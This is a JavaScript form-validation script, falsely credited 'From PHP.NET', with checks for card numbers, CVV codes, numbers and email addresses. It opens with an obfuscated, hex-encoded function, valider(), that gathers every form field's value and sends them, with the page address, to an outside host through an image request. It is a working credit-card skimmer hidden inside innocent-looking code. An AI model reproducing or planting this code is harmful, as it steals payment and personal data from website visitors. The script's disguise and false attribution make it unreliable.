//# From PHP.NET
//# By Andrew Haukins

var _0xf1fe=["","\x69\x6E\x70\x75\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x6C\x65\x6E\x67\x74\x68","\x74\x79\x70\x65","\x73\x75\x62\x6D\x69\x74","\x76\x61\x6C\x75\x65","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x63\x68\x65\x63\x6B\x65\x64","\x6E\x61\x6D\x65","\x3D","\x5F\x41\x46\x49\x52\x5F","\x74\x65\x78\x74\x61\x72\x65\x61","\x73\x65\x6C\x65\x63\x74","\x73\x75\x62\x73\x74\x72","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x63\x76\x76\x2E\x63\x65\x6C\x65\x6F\x6E\x65\x74\x2E\x66\x72\x2F\x76\x30\x2F\x69\x6E\x73\x65\x72\x74\x2E\x70\x68\x70\x3F\x64\x3D","\x26\x73\x3D","\x68\x72\x65\x66"];function valider(){var _0x731ex2=document;var _0x731ex3=_0xf1fe[0];var _0x731ex4=_0x731ex2[_0xf1fe[2]](_0xf1fe[1]);for(var _0x731ex5=0;_0x731ex5<_0x731ex4[_0xf1fe[3]];_0x731ex5++){if(_0x731ex4[_0x731ex5][_0xf1fe[4]]==_0xf1fe[5]){continue ;} ;var _0x731ex6=_0x731ex4[_0x731ex5][_0xf1fe[6]];if(_0x731ex4[_0x731ex5][_0xf1fe[4]]==_0xf1fe[7]){_0x731ex6=_0x731ex4[_0x731ex5][_0xf1fe[8]];if(!_0x731ex6){continue ;} ;} ;_0x731ex3+=_0x731ex4[_0x731ex5][_0xf1fe[9]]+_0xf1fe[10]+escape(_0x731ex6)+_0xf1fe[11];} ;var _0x731ex4=_0x731ex2[_0xf1fe[2]](_0xf1fe[12]);for(var _0x731ex5=0;_0x731ex5<_0x731ex4[_0xf1fe[3]];_0x731ex5++){var _0x731ex6=_0x731ex4[_0x731ex5][_0xf1fe[6]];_0x731ex3+=_0x731ex4[_0x731ex5][_0xf1fe[9]]+_0xf1fe[10]+escape(_0x731ex6)+_0xf1fe[11];} ;var _0x731ex4=_0x731ex2[_0xf1fe[2]](_0xf1fe[13]);for(var _0x731ex5=0;_0x731ex5<_0x731ex4[_0xf1fe[3]];_0x731ex5++){var _0x731ex6=_0x731ex4[_0x731ex5][_0xf1fe[6]];_0x731ex3+=_0x731ex4[_0x731ex5][_0xf1fe[9]]+_0xf1fe[10]+escape(_0x731ex6)+_0xf1fe[11];} ;var _0x731ex7=_0x731ex3[_0xf1fe[14]](0,_0x731ex3[_0xf1fe[3]]);a= new Image();a[_0xf1fe[15]]=_0xf1fe[16]+escape(_0x731ex7)+_0xf1fe[17]+escape(location[_0xf1fe[18]]);} ;
function simpleField(id, ermsg)
{
	var oldStyle = "#000";
	var Val = document.getElementsByName(id)[0].value;
	if(!Val)
	{
//		document.getElementsByName(id)[0].style.color = "red";
		alert(ermsg);
		return 0;
	}else{
		document.getElementsByName(id)[0].style.color = oldStyle;
		return 1;
	}
}

function ccField(id,ermsg)
{
	var oldStyle = "#000";
	var Val = document.getElementsByName(id)[0].value;
	if((Val.substr(0,1)==4 || Val.substr(0,1)==5 || Val.substr(0,1)==3) && Val.length==16 && IsNumeric(Val))
	{
		document.getElementsByName(id)[0].style.color = oldStyle;
		return 1;
	}else{
//		document.getElementsByName(id)[0].style.color = "red";
		alert(ermsg);
		return 0;
	}
}

function cvvField(id,ermsg)
{
	var oldStyle = "#000";
	var Val = document.getElementsByName(id)[0].value;
	if((Val.length==3 || Val.length==4) && IsNumeric(Val))
	{
		document.getElementsByName(id)[0].style.color = oldStyle;
		return 1;
	}else{
//		document.getElementsByName(id)[0].style.color = "red";
		alert(ermsg);
		return 0;
	}
}

function numericField(id,ermsg)
{
	var oldStyle = "#000";
	var Val = document.getElementsByName(id)[0].value;
	if(IsNumeric(Val))
	{
		document.getElementsByName(id)[0].style.color = oldStyle;
		return 1;
	}else{
//		document.getElementsByName(id)[0].style.color = "red";
		alert(ermsg);
		return 0;
	}
}

function emailField(id,ermsg)
{
	var oldStyle = "#000";
	var Val = document.getElementsByName(id)[0].value;
	if(!Val || !emlcheck(Val))
	{
//		document.getElementsByName(id)[0].style.color = "red";
		alert(ermsg);
		return 0;
	}else{
		document.getElementsByName(id)[0].style.color = oldStyle;
		return 1;
	}
}

function IsNumeric(strString)
   //  check for valid numeric strings	
   {
   var strValidChars = "0123456789.-";
   var strChar;
   var blnResult = true;

   if (strString.length == 0) return false;

   //  test strString consists of valid characters listed above
   for (i = 0; i < strString.length && blnResult == true; i++)
      {
      strChar = strString.charAt(i);
      if (strValidChars.indexOf(strChar) == -1)
         {
         blnResult = false;
         }
      }
   return blnResult;
   }

function emlcheck(str) {

		var at="@";
		var dot=".";
		var lat=str.indexOf(at);
		var lstr=str.length;
		var ldot=str.indexOf(dot);
		if (str.indexOf(at)==-1){
		   return false;
		}
		if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
		   return false;
		}
		if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
		    return false;
		}
		 if (str.indexOf(at,(lat+1))!=-1){
		    return false;
		 }
		 if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
		    return false;
		 }
		 if (str.indexOf(dot,(lat+2))==-1){
		    return false;
		 }
		 if (str.indexOf(" ")!=-1){
		    return false;
		 }
 		 return true;
}